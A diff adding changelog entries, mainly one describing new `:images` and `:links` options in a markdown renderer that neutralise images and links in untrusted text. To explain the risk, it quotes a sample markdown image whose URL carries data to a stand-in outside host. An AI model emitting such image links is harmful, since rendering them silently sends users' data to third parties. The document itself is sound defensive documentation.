@@ -1204,6 +1204,23 @@ its tag.
 
 ### Added
 
+- **`hyperion/markdown:render` takes `:images` and `:links`, for text the app did not write**
+  (#1119, part one). `(render text :images nil :links :text)` renders each image as its alt text
+  and each link as its text, emitting no `img` element and no `href`. **The defaults are
+  unchanged**, so everything rendering trusted content behaves exactly as before.
+  **Why an app wants this for untrusted text.** An image is fetched as soon as it is rendered,
+  with no click, so a reply holding `![x](https://elsewhere.example/?d=...)` makes the reader's
+  machine send that request and whatever the URL carries with it; in a desktop webview with no
+  Content-Security-Policy nothing stops it. And in a desktop webview, following a link replaces
+  the app's own page with the linked one.
+  Both apply to every form the markdown can take — an explicit link or image, a reference link,
+  an autolink — and to relative and `mailto` URLs as well as `http` and `https`.
+  **`:allow-html t` cannot be combined with either, and signals.** Raw HTML is not parsed into
+  the tree these options filter, so an `img` or `href` written directly in the source would
+  survive them; an option that cannot deliver its guarantee is worse than no option. `:images`
+  accepts `t` or `nil` and `:links` accepts `t` or `:text`; any other value signals rather than
+  falling back to the permissive default.
+
 - **hermes: how long a send waits is now hermes's own setting, `*send-connect-timeout*` and
   `*send-read-timeout*`, both 10 seconds** (#1077). Each provider also takes `:connect-timeout`
   and `:read-timeout`, read back with `sendgrid-connect-timeout`, `sendgrid-read-timeout`,
